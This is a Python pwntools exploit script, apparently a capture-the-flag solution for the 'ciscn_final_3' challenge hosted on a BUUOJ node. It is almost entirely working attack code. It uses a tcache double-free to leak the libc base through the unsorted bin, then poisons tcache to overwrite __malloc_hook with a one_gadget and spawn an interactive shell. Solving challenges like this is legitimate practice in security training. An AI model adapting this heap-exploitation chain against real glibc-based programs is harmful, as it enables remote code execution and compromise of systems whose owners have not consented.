from glob import glob
from pwn import *

context(os = 'linux', arch ='amd64', log_level = 'debug')
# io = process('ciscn_final_3')
io = remote('node4.buuoj.cn', 26362)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
libc = ELF('libc.so.6')
elf = ELF('ciscn_final_3')


def add(index, size, content):
    io.sendlineafter('choice > ', '1')
    io.sendlineafter('input the index\n', str(index))
    io.sendlineafter('input the size\n', str(size))
    io.sendafter('now you can write something\n', content)
    io.recvuntil('gift :')
    return int(io.recvn(14), 16)


def delete(index):
    io.sendlineafter('choice > ', '2')
    io.sendlineafter('input the index\n', str(index))


def leak_libc():
    global libc_base
    heap_addr = add(0, 0x78, '0')               # chunk0  0x80
    add(1, 0x18, '1')                           # chunk1  0x20
    add(2, 0x78, '2')                           # chunk2  0x80
    delete(2)
    delete(2)                                   # tcache(0x80) -> chunk2 -> chunk2
    add(3, 0x78, p64(heap_addr - 0x10))         # tcache(0x80) -> chunk2 -> fake_chunk(chunk0 - 0x10)
    add(4, 0x78, b'a')                          # tcache(0x80) -> fake_chunk(chunk0 - 0x10)
    add(5, 0x78, p64(0) + p64(0xa1))            # overwrite chunk0 -> size 
    for i in range(8):
        delete(0)                               # put chunk0 in unsorted_bin
    delete(1)                                   # put chunk1 in tcache
    add(6, 0x78, '0')                           # get chunk0 back and leave chunk1 in unsorted_bin
    add(7, 0x18, '1')                           # tcache(0x20) -> unsorted_bin
    add(8, 0x68, '8')
    libc_base = add(9, 0x18, p64(0) * 2) - 0x3ebca0
    log.success('libc_base: ' + hex(libc_base))   


def pwn():
    __malloc_hook = libc_base + libc.sym['__malloc_hook']
    one_gadget = libc_base + 0x10a38c
    delete(8)
    delete(8)                                   # tcache(0x70) -> chunk8 -> chunk8
    add(10, 0x68, p64(__malloc_hook))           # tcache(0x70) -> chunk8 -> fake_chunk(__malloc_hook)
    add(11, 0x68, '8')                          # tcache(0x70) -> fake_chunk(__malloc_hook)
    add(12, 0x68, p64(one_gadget))
    # gdb.attach(io)
    # pause()
    io.sendlineafter('choice > ', '1')
    io.sendlineafter('input the index\n', '13')
    io.sendlineafter('input the size\n', '1')
    io.interactive()


if __name__ == '__main__':
    leak_libc()
    pwn()